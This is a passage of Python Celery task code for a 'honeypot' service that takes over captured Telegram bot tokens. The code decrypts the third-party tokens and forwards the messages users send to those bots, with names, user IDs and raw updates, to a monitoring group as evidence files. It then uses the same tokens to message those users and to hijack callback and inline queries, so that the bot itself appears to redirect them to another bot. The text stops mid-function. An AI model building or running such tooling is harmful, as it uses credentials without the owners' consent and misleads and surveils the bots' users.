"""Honeypot flow task definitions."""

from .broadcast import (
    _is_broadcast_claim_valid,
    _mark_broadcast_failure,
    _record_broadcast_delivery_latency,
    _render_stored_honeypot_broadcast,
    _update_message_broadcast_success,
)
from .common import *


@app.task(name="flow.broadcast_honeypot_message")
def broadcast_honeypot_message(credential_id: str, telegram_msg_id: int):
    """Broadcast a single specific honeypot message to the bot's Telegram topic.

    Targets ONLY the specific honeypot message without draining or flushing
    unbroadcasted scraper history (strictly preserving the ENABLE_RAW_MESSAGE_BROADCAST policy).
    """
    if not getattr(settings, "HONEYPOT_BROADCAST_TO_TOPIC", True):
        return "Disabled: honeypot topic broadcast is disabled."

    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(
        _broadcast_single_honeypot_message(credential_id, telegram_msg_id)
    )

async def _broadcast_single_honeypot_message(credential_id: str, telegram_msg_id: int) -> dict:
    from datetime import datetime

    # Strict namespace validation: honeypot messages MUST have negative telegram_msg_id
    if telegram_msg_id >= 0:
        logger.warning(
            f"[HoneypotBroadcast] Refusing non-negative message ID {telegram_msg_id} (not a honeypot message)"
        )
        return {"status": "skipped", "reason": "invalid_honeypot_id"}

    # 1. Fetch the exact message with joined discovered_credentials
    res = await async_execute(
        db.table("exfiltrated_messages")
        .select("*, discovered_credentials!inner(meta)")
        .eq("credential_id", credential_id)
        .eq("telegram_msg_id", telegram_msg_id)
        .limit(1)
    )
    if not res.data:
        return {"status": "not_found", "credential_id": credential_id, "telegram_msg_id": telegram_msg_id}

    msg = res.data[0] if isinstance(res.data, list) else res.data
    file_meta = msg.get("file_meta") if isinstance(msg.get("file_meta"), dict) else {}
    attachment_only = bool(msg.get("is_broadcasted"))
    if attachment_only and file_meta.get("honeypot_evidence_file_status") != "pending":
        return {"status": "already_broadcasted"}

    # Strict source validation: guarantee only bot_api honeypot messages enter this path
    if file_meta.get("source") != "bot_api":
        logger.warning(
            f"[HoneypotBroadcast] Refusing to broadcast non-honeypot message {telegram_msg_id} (source={file_meta.get('source')})"
        )
        return {"status": "skipped", "reason": "not_honeypot_source"}

    # Atomic claim on this specific message with stale claim (> 5 min) recovery
    from datetime import timedelta
    claim_time = datetime.now(UTC).isoformat()
    stale_claim_cutoff = (datetime.now(UTC) - timedelta(minutes=5)).isoformat()
    claim_query = (
        db.table("exfiltrated_messages")
        .update({"broadcast_claimed_at": claim_time})
        .eq("id", msg["id"])
    )
    if attachment_only:
        claim_query = (
            claim_query
            .eq("is_broadcasted", True)
            .eq("file_meta->>honeypot_evidence_file_status", "pending")
        )
    else:
        claim_query = claim_query.eq("is_broadcasted", False)
    claim_res = await async_execute(
        claim_query.or_(f"broadcast_claimed_at.is.null,broadcast_claimed_at.lt.{stale_claim_cutoff}")
    )
    if not claim_res.data:
        return {"status": "contended"}

    # Resolve topic & broadcaster
    group_id = settings.MONITOR_GROUP_ID
    broadcaster = get_broadcaster()
    meta = (msg.get("discovered_credentials") or {}).get("meta") or {}
    bot_username = meta.get("bot_username")
    bot_id = meta.get("bot_id")
    if bot_username and bot_username != "unknown" and bot_id:
        topic_name = f"@{bot_username} / {bot_id}"
    elif bot_id:
        topic_name = f"@unknown / {bot_id}"
    else:
        topic_name = f"Cred-{credential_id[:8]}"

    saved_topic_id = meta.get("topic_id")
    try:
        thread_id = await broadcaster.ensure_topic(
            group_id,
            topic_name,
            preferred_topic_id=saved_topic_id,
        )
        if str(saved_topic_id or "") != str(thread_id):
            current = await async_execute(
                db.table("discovered_credentials")
                .select("meta")
                .eq("id", credential_id)
                .limit(1)
            )
            current_meta = (current.data or [{}])[0].get("meta") or meta
            updated_meta = dict(current_meta)
            updated_meta["topic_id"] = thread_id
            await async_execute(
                db.table("discovered_credentials")
                .update({"meta": updated_meta})
                .eq("id", credential_id)
            )
    except Exception as topic_err:
        logger.error(f"[HoneypotBroadcast] Could not ensure topic: {topic_err}")
        if attachment_only:
            try:
                await async_execute(
                    db.table("exfiltrated_messages")
                    .update({"broadcast_claimed_at": None})
                    .eq("id", msg["id"])
                    .eq("broadcast_claimed_at", claim_time)
                )
            except Exception:
                logger.exception(
                    f"[HoneypotBroadcast] Could not release evidence claim for {msg['id']}"
                )
            return {
                "status": "sent",
                "broadcast_message_id": msg.get("broadcast_message_id"),
            }

        from app.services.broadcaster_srv import BroadcastSendError

        if not await _mark_broadcast_failure(
            msg,
            BroadcastSendError(
                "topic_failed",
                f"Could not resolve topic '{topic_name}': {topic_err}",
                retryable=True,
            ),
            claim_token=claim_time,
        ):
            return {"status": "fenced_out"}
        return {"status": "topic_failed", "error": str(topic_err)}

    if attachment_only:
        sent_msg_id = msg.get("broadcast_message_id")
    else:
        try:
            broadcast_msg = await _render_stored_honeypot_broadcast(msg)
            if not await _is_broadcast_claim_valid(msg["id"], claim_time, lease_minutes=5):
                logger.warning(f"[HoneypotBroadcast] Fenced out immediately pre-send for {msg['id']}")
                return {"status": "fenced_out"}
            sent_msg_id = await broadcaster.send_message(group_id, thread_id, broadcast_msg)
        except Exception as send_err:
            logger.error(f"❌ [HoneypotBroadcast] Send failed: {send_err}")
            if not await _mark_broadcast_failure(msg, send_err, claim_token=claim_time):
                return {"status": "fenced_out"}
            return {"status": "failed", "error": str(send_err)}

        try:
            completed = await _update_message_broadcast_success(
                msg["id"],
                broadcast_message_id=sent_msg_id,
                claim_token=claim_time,
                additional_payload={
                    "file_meta": {
                        **file_meta,
                        "honeypot_evidence_file_status": "pending",
                    },
                },
            )
        except Exception as state_err:
            logger.error(f"❌ [HoneypotBroadcast] Success state update failed: {state_err}")
            if not await _mark_broadcast_failure(msg, state_err, claim_token=claim_time):
                return {"status": "fenced_out"}
            return {"status": "failed", "error": str(state_err)}
        if not completed:
            return {"status": "fenced_out"}
        _record_broadcast_delivery_latency(msg.get("created_at"))
        logger.info(f"✅ [HoneypotBroadcast] Sent message {msg['id']} to topic {thread_id}")

        # The summary is committed first so a retry can resume only the evidence step.
        claim_time = datetime.now(UTC).isoformat()
        attachment_stale_cutoff = (datetime.now(UTC) - timedelta(minutes=5)).isoformat()
        attachment_claim = await async_execute(
            db.table("exfiltrated_messages")
            .update({"broadcast_claimed_at": claim_time})
            .eq("id", msg["id"])
            .eq("is_broadcasted", True)
            .eq("file_meta->>honeypot_evidence_file_status", "pending")
            .or_(f"broadcast_claimed_at.is.null,broadcast_claimed_at.lt.{attachment_stale_cutoff}")
        )
        if not attachment_claim.data:
            return {"status": "sent", "broadcast_message_id": sent_msg_id}

    if not await _is_honeypot_evidence_claim_valid(msg["id"], claim_time):
        logger.warning(f"[HoneypotBroadcast] Fenced out before evidence send for {msg['id']}")
        return {"status": "fenced_out"}

    try:
        raw_res = await async_execute(
            db.table("honeypot_updates")
            .select("update_id,payload,received_at")
            .eq("credential_id", credential_id)
            .eq("update_id", -telegram_msg_id)
            .limit(1)
        )
        raw_rows = raw_res.data or []
        raw_record = raw_rows[0] if isinstance(raw_rows, list) and raw_rows else raw_rows
        document, filename = _honeypot_evidence_document(msg, raw_record, meta)
        await broadcaster.send_document(group_id, thread_id, document, filename)
    except Exception as document_err:
        logger.error(f"❌ [HoneypotBroadcast] Evidence file send failed: {document_err}")
        try:
            await async_execute(
                db.table("exfiltrated_messages")
                .update({"broadcast_claimed_at": None})
                .eq("id", msg["id"])
                .eq("broadcast_claimed_at", claim_time)
            )
        except Exception:
            logger.exception(f"[HoneypotBroadcast] Could not release evidence claim for {msg['id']}")
        return {
            "status": "evidence_failed",
            "broadcast_message_id": sent_msg_id,
            "error": str(document_err),
        }

    completed = await async_execute(
        db.table("exfiltrated_messages")
        .update({
            "broadcast_claimed_at": None,
            "file_meta": {
                **file_meta,
                "honeypot_evidence_file_status": "sent",
            },
        })
        .eq("id", msg["id"])
        .eq("is_broadcasted", True)
        .eq("broadcast_claimed_at", claim_time)
    )
    if not completed.data:
        return {"status": "fenced_out"}
    return {"status": "sent", "broadcast_message_id": sent_msg_id}


async def _is_honeypot_evidence_claim_valid(msg_id: str, claim_token: str) -> bool:
    """Confirm ownership of the pending evidence attachment before sending it."""
    from datetime import datetime, timedelta

    stale_cutoff = (datetime.now(UTC) - timedelta(minutes=5)).isoformat()
    response = await async_execute(
        db.table("exfiltrated_messages")
        .select("id")
        .eq("id", msg_id)
        .eq("is_broadcasted", True)
        .eq("file_meta->>honeypot_evidence_file_status", "pending")
        .eq("broadcast_claimed_at", claim_token)
        .gte("broadcast_claimed_at", stale_cutoff)
        .limit(1)
    )
    return bool(response.data)


def _honeypot_evidence_document(
    msg: dict,
    raw_record: dict | None,
    credential_meta: dict,
) -> tuple[bytes, str]:
    """Build an untruncated JSON evidence file for one captured Telegram update."""
    import json

    raw_record = raw_record if isinstance(raw_record, dict) else None
    raw_update = raw_record.get("payload") if raw_record else None
    raw_payload = raw_update if isinstance(raw_update, dict) else {}
    file_meta = msg.get("file_meta") if isinstance(msg.get("file_meta"), dict) else {}
    target = next(
        (
            raw_payload.get(key)
            for key in ("message", "channel_post", "edited_message", "edited_channel_post")
            if isinstance(raw_payload.get(key), dict)
        ),
        {},
    )
    sender = target.get("from") if isinstance(target.get("from"), dict) else {}
    callback = raw_payload.get("callback_query") if isinstance(raw_payload.get("callback_query"), dict) else {}
    inline_query = raw_payload.get("inline_query") if isinstance(raw_payload.get("inline_query"), dict) else {}
    if not sender:
        sender_source = callback or inline_query
        sender = sender_source.get("from") if isinstance(sender_source.get("from"), dict) else {}

    chat = target.get("chat") if isinstance(target.get("chat"), dict) else {}
    callback_message = callback.get("message") if isinstance(callback.get("message"), dict) else {}
    callback_chat = callback_message.get("chat") if isinstance(callback_message.get("chat"), dict) else {}

    name_parts = [sender.get("first_name"), sender.get("last_name")]
    display_name = " ".join(
        part.strip() for part in name_parts if isinstance(part, str) and part.strip()
    )
    if not display_name:
        author_signature = target.get("author_signature")
        display_name = author_signature if isinstance(author_signature, str) and author_signature else None
    if not display_name:
        display_name = msg.get("sender_name") or "Unknown"

    message_text = target.get("text") or target.get("caption")
    if message_text is None and callback:
        message_text = f"[Callback Query] {callback.get('data') or ''}"
    if message_text is None and inline_query:
        message_text = f"[Inline Query] {inline_query.get('query') or ''}"
    if message_text is None:
        message_text = msg.get("content") or ""

    def first_present(*values):
        return next((value for value in values if value is not None), None)

    update_id = first_present(
        (raw_record or {}).get("update_id"),
        raw_payload.get("update_id"),
        file_meta.get("update_id"),
        abs(int(msg["telegram_msg_id"])),
    )
    raw_message_id = first_present(target.get("message_id"), callback_message.get("message_id"))
    raw_chat_id = first_present(chat.get("id"), callback_chat.get("id"))
    received_at = first_present((raw_record or {}).get("received_at"), msg.get("created_at"))

    evidence = {
        "message_text": message_text,
        "sender": {
            "telegram_user_id": first_present(sender.get("id"), msg.get("sender_user_id")),
            "display_name": display_name,
            "username": sender.get("username"),
        },
        "received_by": {
            "credential_id": msg.get("credential_id"),
            "bot_id": credential_meta.get("bot_id"),
            "bot_username": credential_meta.get("bot_username"),
            "received_at": received_at,
        },
        "message_ids": {
            "update_id": update_id,
            "honeypot_telegram_msg_id": msg.get("telegram_msg_id"),
            "telegram_message_id": first_present(raw_message_id, file_meta.get("message_id")),
            "chat_id": first_present(raw_chat_id, file_meta.get("chat_id")),
            "callback_query_id": callback.get("id"),
            "inline_query_id": inline_query.get("id"),
        },
        "raw_telegram_update": raw_update,
    }
    if raw_record is None:
        evidence["raw_copy_note"] = "The raw Telegram update has expired from honeypot_updates retention."

    filename = f"honeypot-evidence-{update_id if update_id is not None else 'unknown'}.json"
    return json.dumps(evidence, ensure_ascii=False, indent=2).encode("utf-8"), filename

@app.task(name="flow.honeypot_redirect_sweep")
def honeypot_redirect_sweep():
    """Sweep honeypot_updates for un-redirected messages and send each user
    a redirect to the onboard bot. Fires every 30s via beat.

    The message is sent FROM the captured bot (using its decrypted token)
    TO the user — looks like the bot itself is directing them.
    """
    lock_key = "theprawnhunter:lock:honeypot_redirect_sweep"
    lock = redis_client.lock(lock_key, timeout=25, blocking=False)
    acquired = lock.acquire()
    if not acquired:
        logger.info("[HoneypotSweep] Skipped — previous sweep still in progress or lock held")
        return {"status": "skipped", "reason": "lock_held"}

    last_sweep_key = "theprawnhunter:last_redirect_sweep_time"
    now_ts = time.time()
    last_ts = redis_client.get(last_sweep_key)
    if last_ts and (now_ts - float(last_ts)) < 15.0:
        with contextlib.suppress(Exception):
            lock.release()
        logger.debug("[HoneypotSweep] Skipped — debounced, last sweep ran recently")
        return {"status": "skipped", "reason": "debounced"}

    try:
        from app.workers.celery_app import get_worker_loop
        res = get_worker_loop().run_until_complete(_honeypot_redirect_sweep_logic())
        with contextlib.suppress(Exception):
            redis_client.set(last_sweep_key, str(time.time()), ex=60)
        return res
    finally:
        with contextlib.suppress(Exception):
            lock.release()

_LUA_RELEASE_RESERVATION = """
if redis.call("get", KEYS[1]) == ARGV[1] then
    return redis.call("del", KEYS[1])
else
    return 0
end
"""

def _safe_release_redis_reservation(client, key: str, token: str) -> None:
    try:
        client.eval(_LUA_RELEASE_RESERVATION, 1, key, token)
    except Exception as _swallowed:
        logger.debug(f"[suppressed] {_swallowed}")

async def _honeypot_redirect_sweep_logic() -> dict:
    if not settings.HONEYPOT_REDIRECT_MODE:
        return {"status": "disabled", "reason": "mode_disabled"}
    if not settings.HONEYPOT_REDIRECT_AUTHORIZED:
        return {"status": "skipped", "reason": "not_authorized"}

    from datetime import UTC, datetime, timedelta

    try:
        # Clear stale claims (> 15 min old) across all honeypot update rows
        stale_threshold = (datetime.now(UTC) - timedelta(minutes=15)).isoformat()
        with contextlib.suppress(Exception):
            await async_execute(
                db.table("honeypot_updates")
                .update({"redirect_claimed_at": None})
                .is_("redirected_at", "null")
                .not_.is_("redirect_claimed_at", "null")
                .lt("redirect_claimed_at", stale_threshold)
            )

        # Get un-redirected message-type updates
        res = await async_execute(
            db.table("honeypot_updates")
            .select("id, credential_id, payload, received_at, update_type, redirect_attempt, redirect_error")
            .is_("redirected_at", "null")
            .is_("redirect_claimed_at", "null")
            .in_("update_type", ["message", "callback_query", "inline_query", "edited_message", "channel_post"])
            .order("received_at", desc=False)
            .limit(50)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    rows = res.data or []

    dispatched = 0
    skipped = 0

    from app.core.redis_srv import redis_srv

    for row in rows:
        payload = row.get("payload") or {}
        credential_id = row.get("credential_id")
        update_type = row.get("update_type") or "message"

        # Extract user_id and chat_id based on update_type
        user_id = None
        chat_id = None
        from_user = {}

        if update_type == "message":
            msg = payload.get("message") or {}
            from_user = msg.get("from") or {}
            user_id = from_user.get("id")
            chat_id = msg.get("chat", {}).get("id")
        elif update_type == "callback_query":
            cb = payload.get("callback_query") or {}
            from_user = cb.get("from") or {}
            user_id = from_user.get("id")
            chat_id = cb.get("message", {}).get("chat", {}).get("id") or user_id
        elif update_type == "inline_query":
            iq = payload.get("inline_query") or {}
            from_user = iq.get("from") or {}
            user_id = from_user.get("id")
            chat_id = user_id  # Inline: use user_id
        elif update_type == "edited_message":
            msg = payload.get("edited_message") or {}
            from_user = msg.get("from") or {}
            user_id = from_user.get("id")
            chat_id = msg.get("chat", {}).get("id")
        elif update_type == "channel_post":
            msg = payload.get("channel_post") or {}
            from_user = msg.get("from") or {}
            user_id = from_user.get("id") if not from_user.get("is_bot") else None
            chat_id = msg.get("chat", {}).get("id")

        # Skip bots, missing data
        if not user_id or not chat_id or not credential_id:
            skipped += 1
            continue
        if from_user.get("is_bot"):
            skipped += 1
            continue

        # Finalize rows that reached max attempts (>= 3)
        if (row.get("redirect_attempt") or 0) >= 3:
            logger.info(
                f"[HoneypotSweep] Row {row['id']} reached max attempts ({row.get('redirect_attempt')}), finalizing"
            )
            now_iso = datetime.now(UTC).isoformat()
            with contextlib.suppress(Exception):
                await async_execute(
                    db.table("honeypot_updates")
                    .update({
                        "redirected_at": now_iso,
                        "redirect_claimed_at": None,
                        "redirected_bot": "max_retries_exceeded",
                        "redirect_error": "Exceeded max redirect attempts (3)",
                    })
                    .eq("id", row["id"])
                )
            skipped += 1
            continue

        # Skip dead-token / revoked bots immediately
        is_revoked = False
        row_err = str(row.get("redirect_error") or "")
        if "401" in row_err or "unauthorized" in row_err.lower():
            is_revoked = True
            with contextlib.suppress(Exception):
                redis_srv.client.set(f"credential:revoked:{credential_id}", "1", ex=86400 * 7)
            with contextlib.suppress(Exception):
                await _mark_credential_revoked(credential_id, f"Bot token revoked ({row_err})")

        if not is_revoked:
            try:
                if redis_srv.client.exists(f"credential:revoked:{credential_id}"):
                    is_revoked = True
            except Exception:
                pass

        if not is_revoked:
            try:
                cred_res = await async_execute(
                    db.table("discovered_credentials")
                    .select("status")
                    .eq("id", credential_id)
                    .limit(1)
                )
                if cred_res.data and cred_res.data[0].get("status") == "revoked":
                    is_revoked = True
                    with contextlib.suppress(Exception):
                        redis_srv.client.set(f"credential:revoked:{credential_id}", "1", ex=86400 * 7)
            except Exception:
                pass

        if is_revoked:
            logger.info(
                f"[HoneypotSweep] Skipping redirect for cred:{credential_id[:8]}...: bot token revoked (401)"
            )
            now_skip = datetime.now(UTC).isoformat()
            with contextlib.suppress(Exception):
                await async_execute(
                    db.table("honeypot_updates")
                    .update({
                        "redirected_at": now_skip,
                        "redirect_claimed_at": None,
                        "redirected_bot": "token_revoked",
                        "redirect_error": "Bot token revoked (HTTP 401)",
                    })
                    .eq("id", row["id"])
                )
            skipped += 1
            continue

        # Check if job is already in flight in Redis
        inflight_key = f"redirect:inflight:{row['id']}"
        try:
            if redis_srv.client.exists(inflight_key):
                skipped += 1
                continue
        except Exception:
            pass

        # Per-user dedup: atomically acquire Redis reservation with NX (set only if not exists)
        now_claim = datetime.now(UTC).isoformat()
        claim_token = now_claim
        dedup_key = f"redirect:sent:{credential_id}:{user_id}"
        owner_token = f"claiming:{row['id']}:{claim_token}"
        reserved_dedup = False
        try:
            # 300s temporary hold with attempt-unique owner_token prevents races across sweepers
            reserved_dedup = bool(redis_srv.client.set(dedup_key, owner_token, nx=True, ex=300))
            if not reserved_dedup:
                # Key already exists: another row/worker is actively processing or already sent redirect
                with contextlib.suppress(Exception):
                    await async_execute(
                        db.table("honeypot_updates")
                        .update({
                            "redirected_at": datetime.now(UTC).isoformat(),
                            "redirect_claimed_at": None,
                            "redirected_bot": "dedup_skip",
                        })
                        .eq("id", row["id"])
                    )
                skipped += 1
                continue
        except Exception as redis_exc:
            logger.warning(f"[HoneypotSweep] Redis error during reservation for {dedup_key}: {redis_exc}")
            skipped += 1
            continue

        # INTR-002 / CONC-002: atomic claim — set redirect_claimed_at only
        # if redirected_at and redirect_claimed_at are still NULL. If another sweep
        # already claimed the row, this returns zero rows and we move on. Prevents duplicate DM to victim.
        curr_attempt = row.get("redirect_attempt") or 0
        try:
            claim_res = await async_execute(
                db.table("honeypot_updates")
                .update({
                    "redirect_claimed_at": claim_token,
                    "redirect_attempt": curr_attempt + 1,
                })
                .eq("id", row["id"])
                .is_("redirected_at", "null")
                .is_("redirect_claimed_at", "null")
            )
            if not claim_res.data:
                logger.debug(f"[HoneypotSweep] claim contended for row {row['id']}")
                if reserved_dedup:
                    _safe_release_redis_reservation(redis_srv.client, dedup_key, owner_token)
                skipped += 1
                continue
        except Exception as claim_exc:
            logger.warning(f"[HoneypotSweep] claim failed for row {row['id']}: {claim_exc}")
            if reserved_dedup:
                _safe_release_redis_reservation(redis_srv.client, dedup_key, owner_token)
            skipped += 1
            continue

        # Mark in-flight in Redis with 30m TTL
        with contextlib.suppress(Exception):
            redis_srv.client.set(inflight_key, claim_token, ex=1800)

        # Dispatch redirect with update_type and claim_token for fenced completion
        app.send_task(
            "flow.honeypot_redirect_one",
            kwargs={
                "update_id": row["id"],
                "credential_id": credential_id,
                "user_id": user_id,
                "chat_id": chat_id,
                "update_type": update_type,
                "claim_token": now_claim,
            },
        )
        dispatched += 1

    # Durable retry for deferred honeypot broadcasts and pending evidence files.
    broadcast_now = datetime.now(UTC)
    stale_broadcast_cutoff = (broadcast_now - timedelta(minutes=5)).isoformat()
    broadcast_retry_cutoff = broadcast_now.isoformat()
    broadcast_queries = (
        db.table("exfiltrated_messages")
        .select("credential_id, telegram_msg_id")
        .eq("is_broadcasted", False)
        .eq("file_meta->>source", "bot_api")
        .lt("telegram_msg_id", 0)
        .or_(
            f"and(or(next_retry_at.is.null,next_retry_at.lte.{broadcast_retry_cutoff}),"
            f"or(broadcast_claimed_at.is.null,broadcast_claimed_at.lt.{stale_broadcast_cutoff}))"
        )
        .limit(20),
        db.table("exfiltrated_messages")
        .select("credential_id, telegram_msg_id")
        .eq("is_broadcasted", True)
        .eq("file_meta->>source", "bot_api")
        .eq("file_meta->>honeypot_evidence_file_status", "pending")
        .lt("telegram_msg_id", 0)
        .or_(
            f"and(or(next_retry_at.is.null,next_retry_at.lte.{broadcast_retry_cutoff}),"
            f"or(broadcast_claimed_at.is.null,broadcast_claimed_at.lt.{stale_broadcast_cutoff}))"
        )
        .limit(20),
    )
    broadcast_retry_count = 0
    for query in broadcast_queries:
        try:
            retryable = await async_execute(query)
            for h_msg in retryable.data or []:
                app.send_task(
                    "flow.broadcast_honeypot_message",
                    kwargs={
                        "credential_id": h_msg["credential_id"],
                        "telegram_msg_id": h_msg["telegram_msg_id"],
                    },
                )
                broadcast_retry_count += 1
        except Exception as e:
            logger.debug(f"[HoneypotSweep] deferred broadcast retry error: {e}")

    if not rows and not broadcast_retry_count:
        return {"status": "idle", "pending": 0}

    return {"status": "ok", "dispatched": dispatched, "skipped": skipped, "pending": len(rows)}

@app.task(name="flow.honeypot_redirect_one")
def honeypot_redirect_one(
    update_id: str,
    credential_id: str,
    user_id: int,
    chat_id: int,
    update_type: str = "message",
    claim_token: str | None = None,
):
    """Send a redirect message to a single user via the captured bot's token."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(
        _honeypot_redirect_one_logic(update_id, credential_id, user_id, chat_id, update_type, claim_token=claim_token)
    )

async def _honeypot_redirect_one_logic(
    update_id: str,
    credential_id: str,
    user_id: int,
    chat_id: int,
    update_type: str = "message",
    claim_token: str | None = None,
) -> dict:
    from datetime import datetime, timedelta

    import httpx

    from app.services.engagement import pseudonymize_engagement_subject
    from app.workers.tasks.honeypot_redirect_strategies import (
        HoneypotRedirectStrategies,
        TelegramDeliveryResult,
        _telegram_delivery_result,
        _telegram_transport_error,
    )

    dedup_key = f"redirect:sent:{credential_id}:{user_id}"
    owner_token = f"claiming:{update_id}:{claim_token}" if claim_token else None
    inflight_key = f"redirect:inflight:{update_id}"

    def _log_recorded_delivery(
        delivery: TelegramDeliveryResult,
        timestamp: str,
    ) -> None:
        subject = pseudonymize_engagement_subject(user_id)
        logger.info(
            f"[Redirect] delivery recorded credential={credential_id} "
            f"subject={subject} method={delivery.method} "
            f"message_id={delivery.message_id} timestamp={timestamp}"
        )

    async def _cleanup_inflight():
        try:
            from app.core.redis_srv import redis_srv
            redis_srv.client.delete(inflight_key)
        except Exception as _swallowed:
            logger.debug(f"[suppressed] {_swallowed}")

    async def _is_fence_valid() -> bool:
        if not claim_token:
            return False
        try:
            check = await async_execute(
                db.table("honeypot_updates")
                .select("id")
                .eq("id", update_id)
                .eq("redirect_claimed_at", claim_token)
                .is_("redirected_at", "null")
                .limit(1)
            )
            return bool(check.data)
        except Exception as check_exc:
            logger.warning(f"[HoneypotRedirect] fence check error for {update_id}: {check_exc}")
            return False

    async def _release_pending_claim(reason_tag: str) -> None:
        await _cleanup_inflight()
        if not claim_token:
            return
        try:
            query = (
                db.table("honeypot_updates")
                .update({"redirect_claimed_at": None, "redirected_at": None})
                .eq("id", update_id)
                .eq("redirect_claimed_at", claim_token)
            )
            await async_execute(query)
            logger.debug(
                f"[HoneypotRedirect] released pending claim on {update_id} ({reason_tag})"
            )
        except Exception as _release_exc:
            logger.debug(
                f"[HoneypotRedirect] could not release pending claim: {_release_exc}"
            )
        # Release temporary claiming reservation atomically using owner_token
        if owner_token:
            try:
                from app.core.redis_srv import redis_srv
                _safe_release_redis_reservation(redis_srv.client, dedup_key, owner_token)
            except Exception as _swallowed:
                logger.debug(f"[suppressed] {_swallowed}")

    if not settings.HONEYPOT_REDIRECT_MODE:
        await _release_pending_claim("mode_disabled")
        return {"status": "skipped", "reason": "mode_disabled"}
    if not settings.HONEYPOT_REDIRECT_AUTHORIZED:
        await _release_pending_claim("not_authorized")
        return {"status": "skipped", "reason": "not_authorized"}

    # Strict fence: jobs without a claim_token are completely disallowed from executing
    if not claim_token:
        logger.warning(
            f"🔀 [Redirect] Missing claim_token for row {update_id} — unfenced execution rejected"
        )
        return {"status": "fenced_out", "reason": "missing_claim_token"}

    # Immediate dead-token check: if credential was marked revoked, skip redirect permanently
    try:
        from app.core.redis_srv import redis_srv
        if redis_srv.client.exists(f"credential:revoked:{credential_id}"):
            await _cleanup_inflight()
            logger.warning(
                f"🔀 [Redirect] Skipped dead-token job for cred:{credential_id[:8]}...: token revoked (HTTP 401)"
            )
            now_skip = datetime.now(UTC).isoformat()
            with contextlib.suppress(Exception):
                await async_execute(
                    db.table("honeypot_updates")
                    .update({
                        "redirected_at": now_skip,
                        "redirect_claimed_at": None,
                        "redirected_bot": "token_revoked",
                        "redirect_error": "Bot token revoked (HTTP 401)",
                    })
                    .eq("id", update_id)
                )
            return {"status": "skipped", "reason": "token_revoked", "credential_id": credential_id}
    except Exception:
        pass

    redirect_bot = settings.HONEYPOT_REDIRECT_BOT
    deeplink = settings.HONEYPOT_REDIRECT_DEEPLINK
    redirect_url = f"https://t.me/{redirect_bot}?start={deeplink}"

    # Level 3: Callback query hijack
    if update_type == "callback_query":
        try:
            payload = await async_execute(
                db.table("honeypot_updates")
                .select("payload")
                .eq("id", update_id)
                .limit(1)
            )
            if not payload.data:
                await _cleanup_inflight()
                return {"status": "payload_not_found"}

            cb = payload.data[0].get("payload", {}).get("callback_query", {})
            callback_id = cb.get("id")

            bot_token = await HoneypotRedirectStrategies.get_bot_token(credential_id)
            if not bot_token:
                await _cleanup_inflight()
                return {"status": "token_decrypt_failed"}

            if not await _is_fence_valid():
                await _cleanup_inflight()
                logger.warning(f"🔀 [Callback] Fenced out immediately pre-send for {update_id}")
                return {"status": "fenced_out", "credential_id": credential_id}

            delivery = await HoneypotRedirectStrategies.send_callback_hijack(
                bot_token, callback_id, redirect_url, redirect_bot
            )

            if delivery.accepted:
                updated = await HoneypotRedirectStrategies.update_redirect_record(
                    update_id,
                    user_id,
                    redirect_bot,
                    delivery,
                    claim_token=claim_token,
                )
                if not updated:
                    await _cleanup_inflight()
                    logger.warning(f"🔀 [Callback] Fenced out post-send for {update_id}")
                    return {"status": "fenced_out", "credential_id": credential_id}
                HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
                _log_recorded_delivery(delivery, datetime.now(UTC).isoformat())
            else:
                await _release_pending_claim("callback_send_failed")
                logger.warning(
                    f"[Callback] delivery failed credential={credential_id} "
                    f"reason={delivery.error}"
                )

            await _cleanup_inflight()
            return {"status": "callback_handled", "sent": delivery.accepted}
        finally:
            await _cleanup_inflight()

    # Level 4: Inline query hijack
    elif update_type == "inline_query":
        try:
            payload = await async_execute(
                db.table("honeypot_updates")
                .select("payload")
                .eq("id", update_id)
                .limit(1)
            )
            if not payload.data:
                await _cleanup_inflight()
                return {"status": "payload_not_found"}

            iq = payload.data[0].get("payload", {}).get("inline_query", {})
            inline_id = iq.get("id")
            query_text = iq.get("query", "")

            bot_token = await HoneypotRedirectStrategies.get_bot_token(credential_id)
            if not bot_token:
                await _cleanup_inflight()
                return {"status": "token_decrypt_failed"}

            if not await _is_fence_valid():
                await _cleanup_inflight()
                logger.warning(f"🔀 [Inline] Fenced out immediately pre-send for {update_id}")
                return {"status": "fenced_out", "credential_id": credential_id}

            delivery = await HoneypotRedirectStrategies.send_inline_hijack(
                bot_token, inline_id, query_text, redirect_url, redirect_bot
            )

            if delivery.accepted:
                updated = await HoneypotRedirectStrategies.update_redirect_record(
                    update_id,
                    user_id,
                    redirect_bot,
                    delivery,
                    claim_token=claim_token,
                )
                if not updated:
                    await _cleanup_inflight()
                    logger.warning(f"🔀 [Inline] Fenced out post-send for {update_id}")
                    return {"status": "fenced_out", "credential_id": credential_id}
                HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
                _log_recorded_delivery(delivery, datetime.now(UTC).isoformat())
            else:
                await _release_pending_claim("inline_send_failed")
                logger.warning(
                    f"[Inline] delivery failed credential={credential_id} "
                    f"reason={delivery.error}"
                )

            await _cleanup_inflight()
            return {"status": "inline_handled", "sent": delivery.accepted}
        finally:
            await _cleanup_inflight()

    # Get the captured bot's token
    try:
        cred = await async_execute(
            db.table("discovered_credentials")
            .select("bot_token, status")
            .eq("id", credential_id)
            .limit(1)
        )
        if not cred.data:
            await _cleanup_inflight()
            return {"status": "credential_not_found"}

        cred_status = cred.data[0].get("status")
        if cred_status == "revoked":
            await _cleanup_inflight()
            logger.warning(
                f"🔀 [Redirect] Skipped dead-token job for cred:{credential_id[:8]}...: credential status is revoked"
            )
            now_skip = datetime.now(UTC).isoformat()
            with contextlib.suppress(Exception):
                await async_execute(
                    db.table("honeypot_updates")
                    .update({
                        "redirected_at": now_skip,
                        "redirect_claimed_at": None,
                        "redirected_bot": "token_revoked",
                        "redirect_error": "Bot token revoked (status=revoked)",
                    })
                    .eq("id", update_id)
                )
            return {"status": "skipped", "reason": "token_revoked", "credential_id": credential_id}

        bot_token = security.decrypt(cred.data[0]["bot_token"]).strip()
    except Exception as e:
        await _cleanup_inflight()
        with contextlib.suppress(Exception):
            query = db.table("honeypot_updates").update({"redirect_error": f"token_decrypt: {str(e)[:100]}"}).eq("id", update_id)
            if claim_token:
                query = query.eq("redirect_claimed_at", claim_token)
            await async_execute(query)
